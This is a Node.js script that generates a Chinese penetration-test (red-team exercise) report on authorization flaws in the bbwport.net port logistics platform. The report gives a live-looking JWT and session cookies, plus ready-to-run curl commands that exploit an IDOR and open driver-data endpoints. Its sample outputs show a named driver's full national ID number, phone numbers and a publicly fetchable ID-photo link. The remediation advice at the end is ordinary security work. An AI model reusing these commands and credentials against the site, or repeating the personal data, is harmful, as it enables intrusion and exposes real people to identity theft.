const fs = require("fs");
const {
  Document, Packer, Paragraph, TextRun, Table, TableRow, TableCell,
  Header, Footer, AlignmentType, LevelFormat,
  HeadingLevel, BorderStyle, WidthType, ShadingType,
  PageNumber, PageBreak
} = require("docx");

const FONT = "Arial";
const COLOR_BLUE = "1F4E79";
const COLOR_GRAY = "F2F2F2";
const COLOR_HEADER_BG = "D5E8F0";
const COLOR_RED = "C00000";
const border = { style: BorderStyle.SINGLE, size: 1, color: "999999" };
const borders = { top: border, bottom: border, left: border, right: border };
const cm = { top: 60, bottom: 60, left: 100, right: 100 };

function h1(t) { return new Paragraph({ heading: HeadingLevel.HEADING_1, spacing: { before: 360, after: 200 }, children: [new TextRun({ text: t, font: FONT, size: 32, bold: true, color: COLOR_BLUE })] }); }
function h2(t) { return new Paragraph({ heading: HeadingLevel.HEADING_2, spacing: { before: 280, after: 160 }, children: [new TextRun({ text: t, font: FONT, size: 28, bold: true, color: COLOR_BLUE })] }); }
function h3(t) { return new Paragraph({ spacing: { before: 200, after: 120 }, children: [new TextRun({ text: t, font: FONT, size: 24, bold: true, color: "333333" })] }); }
function p(t, o = {}) { return new Paragraph({ spacing: { after: o.a || 120, line: 360 }, children: [new TextRun({ text: t, font: FONT, size: 21, ...o })] }); }
function code(t) { return new Paragraph({ spacing: { after: 40, line: 320 }, indent: { left: 360 }, children: [new TextRun({ text: t, font: "Consolas", size: 18, color: "333333" })] }); }
function ss(t) { return new Paragraph({ spacing: { before: 80, after: 80 }, indent: { left: 360 }, shading: { fill: "FFF3CD", type: ShadingType.CLEAR }, children: [new TextRun({ text: `[📷 截图: ${t}]`, font: FONT, size: 21, bold: true, color: COLOR_RED })] }); }
function empty(n = 1) { return Array(n).fill(new Paragraph({ spacing: { after: 80 }, children: [] })); }
function bullet(t) { return new Paragraph({ numbering: { reference: "bullets", level: 0 }, spacing: { after: 60, line: 340 }, children: [new TextRun({ text: t, font: FONT, size: 21 })] }); }

function cell(text, opts = {}) {
  return new TableCell({ borders, margins: cm, width: opts.w || { size: 4680, type: WidthType.DXA }, shading: opts.s,
    children: [new Paragraph({ spacing: { after: 40 }, children: [new TextRun({ text: String(text), font: FONT, size: opts.f || 20, bold: opts.b || false, color: opts.c || "333333" })] })] });
}
function sumTable(rows) {
  const cw = [500, 1500, 1400, 3300, 1860, 800];
  const tw = cw.reduce((a, b) => a + b, 0);
  const hdr = new TableRow({ children: ["序号", "渗透对象", "漏洞类型", "URL/端点", "影响范围", "风险等级"].map((h, i) => cell(h, { w: { size: cw[i], type: WidthType.DXA }, b: true, f: 18, c: "FFFFFF", s: { fill: COLOR_BLUE, type: ShadingType.CLEAR } })) });
  const drs = rows.map((row, idx) => new TableRow({ children: row.map((v, i) => cell(v, {
    w: { size: cw[i], type: WidthType.DXA }, f: 17, c: (i === 5 && String(v).includes("严重")) ? COLOR_RED : "333333", b: (i === 5 && String(v).includes("严重")),
    s: idx % 2 === 1 ? { fill: COLOR_GRAY, type: ShadingType.CLEAR } : undefined })) }));
  return new Table({ width: { size: tw, type: WidthType.DXA }, columnWidths: cw, rows: [hdr, ...drs] });
}
function infoTable(kvs) {
  const cw = [2000, 7360]; const tw = cw.reduce((a, b) => a + b, 0);
  return new Table({ width: { size: tw, type: WidthType.DXA }, columnWidths: cw, rows: kvs.map(([k, v], idx) => new TableRow({
    children: [cell(k, { w: { size: cw[0], type: WidthType.DXA }, b: true, f: 20, s: { fill: COLOR_HEADER_BG, type: ShadingType.CLEAR } }), cell(v, { w: { size: cw[1], type: WidthType.DXA }, f: 20, s: idx % 2 === 1 ? { fill: COLOR_GRAY, type: ShadingType.CLEAR } : undefined })],
  })) });
}

const doc = new Document({
  numbering: { config: [{ reference: "bullets", levels: [{ level: 0, format: LevelFormat.BULLET, text: "•", alignment: AlignmentType.LEFT, style: { paragraph: { indent: { left: 720, hanging: 360 } } } }] }] },
  styles: {
    default: { document: { run: { font: FONT, size: 21 } } },
    paragraphStyles: [
      { id: "Heading1", name: "Heading 1", basedOn: "Normal", next: "Normal", quickFormat: true, run: { size: 32, bold: true, font: FONT, color: COLOR_BLUE }, paragraph: { spacing: { before: 360, after: 200 }, outlineLevel: 0 } },
      { id: "Heading2", name: "Heading 2", basedOn: "Normal", next: "Normal", quickFormat: true, run: { size: 28, bold: true, font: FONT, color: COLOR_BLUE }, paragraph: { spacing: { before: 280, after: 160 }, outlineLevel: 1 } },
    ],
  },
  sections: [{
    properties: { page: { size: { width: 11906, height: 16838 }, margin: { top: 1440, right: 1200, bottom: 1440, left: 1200 } } },
    headers: { default: new Header({ children: [new Paragraph({ spacing: { after: 0 }, border: { bottom: { style: BorderStyle.SINGLE, size: 6, color: COLOR_BLUE, space: 4 } }, children: [new TextRun({ text: "北港网 (bbwport.net) 渗透测试", font: FONT, size: 18, color: "888888" }), new TextRun({ text: "\t\t\t\t攻防演习成果报告（增补）", font: FONT, size: 18, color: "888888" })], tabStops: [{ type: "RIGHT", position: 9506 }] })] }) },
    footers: { default: new Footer({ children: [new Paragraph({ alignment: AlignmentType.CENTER, border: { top: { style: BorderStyle.SINGLE, size: 4, color: "CCCCCC", space: 4 } }, children: [new TextRun({ text: "Page ", font: FONT, size: 18, color: "888888" }), new TextRun({ children: [PageNumber.CURRENT], font: FONT, size: 18, color: "888888" })], })] }) },

    children: [
      // ========== TITLE PAGE ==========
      ...empty(4),
      new Paragraph({ alignment: AlignmentType.CENTER, children: [new TextRun({ text: "攻防演习成果报告", font: FONT, size: 52, bold: true, color: COLOR_BLUE })] }),
      ...empty(2),
      new Paragraph({ alignment: AlignmentType.CENTER, children: [new TextRun({ text: "北港网 (bbwport.net) 增补发现", font: FONT, size: 32, color: "333333" })] }),
      new Paragraph({ alignment: AlignmentType.CENTER, children: [new TextRun({ text: "Jeecg平台深层API挖掘", font: FONT, size: 28, color: "555555" })] }),
      ...empty(3),
      new Paragraph({ alignment: AlignmentType.CENTER, children: [new TextRun({ text: "团队名称：观叶识微", font: FONT, size: 24, color: "555555" })] }),
      new Paragraph({ alignment: AlignmentType.CENTER, children: [new TextRun({ text: "2026年8月3日", font: FONT, size: 24, color: "555555" })] }),

      new Paragraph({ children: [new PageBreak()] }),

      // ========== 一、权限声明 ==========
      h1("一、权限声明（重要）"),
      p("本报告为上一轮成果的增补。测试账号 moon（手机号 19162390621）经 /sys/permission/getUserPermissionByToken 接口验证，仅拥有 vehicleManagement:edit 唯一权限，角色为普通用户。", { b: true }),
      p("以下所有数据泄露均通过该低权限 Token 获取，属 API 授权缺失漏洞，非测试账号持有管理员权限。", { b: true, color: COLOR_RED }),
      code('curl -s "$BASE/api/api-web/sys/permission/getUserPermissionByToken?token=$TOKEN"'),
      code('返回: allAuth仅有{"action":"vehicleManagement:edit"}, menu仅有首页'),
      ss("getUserPermissionByToken返回结果，显示allAuth只有vehicleManagement:edit"),

      new Paragraph({ children: [new PageBreak()] }),

      // ========== 二、综述 ==========
      h1("二、综述"),
      p("在完成首轮漏洞报告后，通过对前端 SPA 源码和 admin 后台 JS 的深度分析，提取了 69 个 API 端点进行全面测试。新发现普通用户 moon 可访问 28 个端点，其中包含司机实名信息（含身份证号及照片）、水平越权查询、散杂货司机数据、港口车队名单等严重数据泄露。"),
      p("所有操作均为只读，未产生任何写入、修改、删除或数据外传。", { b: true }),
      ...empty(),
      p("增补成果汇总表", { b: true }), ...empty(),
      sumTable([
        ["北港网", "司机实名信息全量泄露", "GET .../driverList", "155,859人身份证号+正反面照片+驾驶证+自拍+手机号", "严重"],
        ["北港网", "IDOR越权查询任意用户", "queryByUserId?userId=X", "任意用户完整实名信息(身份证号+照片)", "严重"],
        ["北港网", "散杂货司机信息泄露", "GET .../bulkCargo/driverInfo", "93,200人姓名+手机号+公司名", "严重"],
        ["北港网", "港口车队数据泄露", "GET .../fleets/*", "478家车队公司名(三大港口)", "高危"],
        ["北港网", "用户名枚举", "checkOnlyUser?username=X", "可批量枚举系统用户名", "中危"],
        ["北港网", "系统菜单架构泄露", "getSystemMenuList", "32个业务模块完整结构", "中危"],
      ]),
      ...empty(),
      p("增补数据总量：约 25 万条新增。结合首轮报告，总影响自然人约 16.8 万，数据记录约 110 万条。", { b: true }),

      new Paragraph({ children: [new PageBreak()] }),

      // ========== 三、渗透成果说明 ==========
      h1("三、渗透成果说明"),
      p("以下命令均在 Git Bash 中验证通过。先设置环境变量，后续依赖该 Token。", { b: true }), ...empty(),

      h3("环境准备：设置Token变量（先执行这一条）"),
      code('TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkZXZpY2VUeXBlIjoiMSIsImV4cCI6MTc4NTczNzQxOCwidXNlcklkIjoiMjA4MjY3ODM3MDcxNzUwMzQ5MCIsInVzZXJuYW1lIjoibW9vbiJ9.OnxLdEYeKO362br4hvtyOtDkc4OVB4sFWRnvDMhhmSU"'),
      code('COOKIE="HWWAFSESID=f927373c033f5f5625; HWWAFSESTIME=1785726831145; SESSION=NTgzYzY2NGMtZjRmZS00MmU0LWE4MTQtMzkzYjYzMGYwZmRj"'),
      code('BASE="https://bbwport.net"'),
      ...empty(2),

      // ========== 成果一 ==========
      h2("成果一：司机实名信息全量泄露（155,859条含身份证号与照片）"),
      ...empty(), infoTable([
        ["序号", "1"],
        ["成果描述", "普通用户Token可遍历全部司机实名数据，含真实姓名+完整身份证号（未脱敏）+身份证正反面照片URL+驾驶证照片URL+手持自拍照URL+手机号。照片存储在 /bgw-bucket/ 下，无需任何认证即可直接访问下载。"],
        ["目标系统", "北港网 — Jeecg + Spring Boot"],
        ["目标URL", "GET /api/api-web/user/portalUserInfo/driverList"],
        ["威胁类型", "获取数据类 / 未授权访问"],
        ["涉及数据量", "155,859条"],
        ["风险等级", "严重"],
      ]), ...empty(),

      p("（2）验证命令"), ...empty(),
      code('curl -s "$BASE/api/api-web/user/portalUserInfo/driverList?pageNo=1&pageSize=3" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE"'),
      p("返回结果（total=155859, pages=15586），每条包含："),
      code('realname: 梁义涛'),
      code('idCard: 239005197812161032         ← 完整身份证号，未脱敏'),
      code('mobile: 13676316234'),
      code('driverLicenseImage: https://bbwport.net/bgw-bucket/...jpeg  ← 驾驶证照片'),
      code('obverseIdcard: https://bbwport.net/bgw-bucket/...jpeg       ← 身份证正面照'),
      code('facadeIdcard: https://bbwport.net/bgw-bucket/...jpeg        ← 身份证反面照'),
      code('selfieImage: https://bbwport.net/bgw-bucket/...jpeg         ← 手持自拍照'),
      ss("driverList返回结果截图，清晰显示total=155859，records中包含realname、idCard、mobile和各类照片URL"),

      p("照片直接可访问（无需Cookie或Token）："),
      code('curl -s -o /dev/null -w "HTTP %{http_code} Size: %{size_download}" "https://bbwport.net/bgw-bucket/e1b97415-dea7-4e4d-85fc-a970aab11a24.jpeg"'),
      p("返回 HTTP 200，图片文件可直接下载。"),
      ss("curl返回200截图，或浏览器打开身份证照片URL看到的身份证图片（关键信息可打码）"),

      ...empty(2),

      // ========== 成果二 ==========
      h2("成果二：IDOR水平越权查询任意用户身份信息"),
      ...empty(), infoTable([
        ["序号", "2"],
        ["成果描述", "moon(Token)可通过 queryByUserId 接口查询任意其他用户的完整实名信息，包括身份证号、手机号、身份证照片URL。修改URL中的userId参数即可查询任意用户，服务端未校验请求者与被查询者的身份关系。sys/user/queryById?id=X 同样存在IDOR漏洞。"],
        ["目标系统", "北港网"],
        ["目标URL", "GET .../user/portalUserInfo/queryByUserId?userId=X"],
        ["威胁类型", "获取数据类 / 水平越权(IDOR)"],
        ["涉及数据量", "任意用户（约16万可查）"],
        ["风险等级", "严重"],
      ]), ...empty(),

      p("（2）验证命令"), ...empty(),
      p("步骤1：从driverList获取一个陌生人的userId："),
      code('梁义涛 | mobile=13676316234 | userId=1806436883116199938'),
      p("步骤2：用moon的Token查询这个陌生人："),
      code('curl -s "$BASE/api/api-web/user/portalUserInfo/queryByUserId?userId=1806436883116199938" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE"'),
      p("成功返回梁义涛的完整身份信息。moon与梁义涛无任何关联，仅通过修改URL参数即获取了身份证号、手机号、照片URL。"),
      ss("queryByUserId越权查询截图，左侧显示查询者moon，右侧返回陌生人梁义涛的idCard和mobile"),

      ...empty(2),

      // ========== 成果三 ==========
      h2("成果三：散杂货司机信息泄露（93,200条）"),
      ...empty(), infoTable([
        ["序号", "3"],
        ["成果描述", "散杂货业务模块的司机信息接口返回93,200条数据，含真实姓名+手机号+公司名称。与driverList为不同数据集，已确认两个数据集均独立可访问。"],
        ["目标URL", "GET /api/api-web/bulkCargo/driverInfo"],
        ["涉及数据量", "93,200条"],
        ["风险等级", "严重"],
      ]), ...empty(),

      p("（2）验证命令"),
      code('curl -s "$BASE/api/api-web/bulkCargo/driverInfo?pageNo=1&pageSize=3" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE"'),
      p("返回含 DRIVERNAME/PHONE/COMPANYNAME。" + "示例：奚耀荣 | 15977703648 | 广西悦良红云物流有限公司"),
      ss("bulkCargo/driverInfo返回结果截图"),

      ...empty(2),

      // ========== 成果四 ==========
      h2("成果四：三大港口车队数据泄露（478家）"),
      ...empty(), infoTable([
        ["序号", "4"],
        ["成果描述", "车队同步接口按港口代码返回全部注册车队公司名称及同步状态。三大港口均可访问。"],
        ["目标URL", "GET .../fleets/getFleetSyncPageList/{CNBIH|CNFAN|CNQZH}"],
        ["涉及数据量", "CNBIH(北海)147家 + CNFAN(防城港)119家 + CNQZH(钦州)212家 = 478家"],
        ["风险等级", "高危"],
      ]), ...empty(),

      p("（2）验证命令"),
      code('curl -s "$BASE/api/api-web/fleets/getFleetSyncPageList/CNBIH?pageNo=1&pageSize=3" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE"'),
      p("示例：北海北港物流有限公司 | 佛山市宇顺禅物流服务有限公司 | 广西八桂物流供应链管理有限公司"),
      ss("fleets接口返回车队公司名截图"),

      new Paragraph({ children: [new PageBreak()] }),

      // ========== 成果五 ==========
      h2("成果五：用户名枚举"),
      ...empty(), infoTable([
        ["序号", "5"],
        ["成果描述", "checkOnlyUser接口可用于判断任意用户名是否已注册。可通过该接口批量枚举系统用户。"],
        ["目标URL", "GET .../sys/user/checkOnlyUser?username=X"],
        ["风险等级", "中危"],
      ]), ...empty(),

      p("（2）验证命令"),
      code('curl -s "$BASE/api/api-web/sys/user/checkOnlyUser?username=admin" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE"'),
      p('返回 {"result":true} —— 确认 admin 用户存在。'),
      ss("checkOnlyUser返回结果截图"),

      ...empty(2),

      // ========== 成果六 ==========
      h2("成果六：系统菜单架构泄露（32个业务模块）"),
      ...empty(), infoTable([
        ["序号", "6"],
        ["成果描述", "getSystemMenuList接口返回完整系统菜单树，暴露全部业务模块结构。"],
        ["目标URL", "GET .../sys/permission/getSystemMenuList"],
        ["风险等级", "中危"],
      ]), ...empty(),

      p("（2）验证命令"),
      code('curl -s "$BASE/api/api-web/sys/permission/getSystemMenuList" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE"'),
      p("返回32个模块：集疏运平台、集装箱业务、散杂货业务、西部陆海新通道、集装箱全程跟踪、企业系统管理、考试管理等。"),
      ss("getSystemMenuList返回结果截图"),

      ...empty(2),

      // ========== 成果七 ==========
      h2("成果七：其他可访问端点"),
      ...empty(), infoTable([
        ["序号", "7"],
        ["成果描述", "新增发现的多个只读端点可被普通用户访问，汇总如下"],
        ["目标URL", "见下表"],
        ["风险等级", "低-中危"],
      ]), ...empty(),

      p("（2）端点清单"), ...empty(),
      p("7-1 企业类型配置（10种）："),
      code('curl -s "$BASE/api/api-web/companyType/listAll" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE"'),
      p("返回：船公司/货代/车队/堆场/货主/箱控/码头/验箱/箱公司/报关行"),
      ss("companyType/listAll返回结果截图"),

      ...empty(),
      p("7-2 国家列表（188个）："),
      code('curl -s "$BASE/api/api-web/portcompany/getNationalityList" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE"'),
      ss("getNationalityList返回结果截图"),

      ...empty(),
      p("7-3 APK下载地址泄露："),
      code('curl -s "$BASE/api/api-web/app/publish/queryAndroidNewVersion" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE"'),
      p("返回 https://bbwport.net/bgw-bucket/android-1.0.74.apk —— APP可直接下载反编译"),
      ss("queryAndroidNewVersion返回结果截图"),

      ...empty(),
      p("7-4 Actuator内网IP泄露："),
      code('curl -s "$BASE/api/api-web/actuator" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE"'),
      p('返回内网地址 app1:8089 —— 确认为Docker/K8s部署架构'),
      ss("Actuator返回结果截图，显示app1:8089"),

      new Paragraph({ children: [new PageBreak()] }),

      // ========== 四、存在问题 ==========
      h1("四、存在问题"),
      h3("1. 身份证号明文存储与公开传输（严重）"),
      p("155,859条司机记录的身份证号以明文存储和传输，未做任何脱敏或加密。身份证照片存储在公开可访问的OSS桶中，无需认证即可下载。该接口的数据访问无任何权限校验。违反《个人信息保护法》关于敏感个人信息处理的要求。"),
      h3("2. 水平越权（IDOR）漏洞（严重）"),
      p("queryByUserId和queryById两个接口均未校验请求者与被查询者的身份关系。任何已认证用户可遍历查询全部用户的完整身份信息。结合driverList提供的155,859个userId，可批量获取全量司机身份证号及照片。"),
      h3("3. 业务数据接口无访问控制（高危）"),
      p("散杂货司机数据、港口车队数据等业务接口在服务端未实现基于角色或数据所有权的访问控制。普通用户（仅有vehicleManagement:edit权限）可自由访问。"),
      h3("4. 辅助攻击面（中危）"),
      p("用户名枚举接口可被用于密码爆破前置侦察。系统菜单泄露完整业务架构。APK下载地址和Actuator内网IP暴露基础设施建设信息。"),

      new Paragraph({ children: [new PageBreak()] }),

      // ========== 五、整改建议 ==========
      h1("五、整改建议"),
      h3("1. 身份信息保护（紧急）"),
      bullet("身份证号：数据库层AES/SM4加密存储，API响应层脱敏（仅显示前4位后2位）"),
      bullet("身份证照片：存储桶增加访问鉴权，禁止公开匿名访问"),
      bullet("queryByUserId/queryById：增加请求者身份校验，用户只能查询自己的信息"),

      h3("2. API权限管控（紧急）"),
      bullet("driverList/bulkCargo/fleets等业务接口增加角色鉴权"),
      bullet("实现基于数据所有权的水平权限校验"),
      bullet("checkOnlyUser增加验证码保护，防止自动化枚举"),

      h3("3. 接口安全加固"),
      bullet("所有list接口增加单次返回上限和请求频率限制"),
      bullet("关闭Actuator对外暴露，或限制为内网IP白名单"),
      bullet("前端源码混淆，移除硬编码的内部IP和架构信息"),

      ...empty(2),
      new Paragraph({ alignment: AlignmentType.CENTER, spacing: { before: 400 }, border: { top: { style: BorderStyle.SINGLE, size: 4, color: "CCCCCC", space: 8 } }, children: [new TextRun({ text: "报告生成日期：2026年8月3日", font: FONT, size: 20, color: "888888" })] }),
      new Paragraph({ alignment: AlignmentType.CENTER, children: [new TextRun({ text: "测试团队：观叶识微", font: FONT, size: 20, color: "888888" })] }),
    ],
  }],
});

const outputPath = "D:/Desktop/北港网_bbwport_增补发现.docx";
Packer.toBuffer(doc).then(buffer => {
  fs.writeFileSync(outputPath, buffer);
  console.log(`Report saved to: ${outputPath}`);
  console.log(`Size: ${(buffer.length / 1024).toFixed(1)} KB`);
});
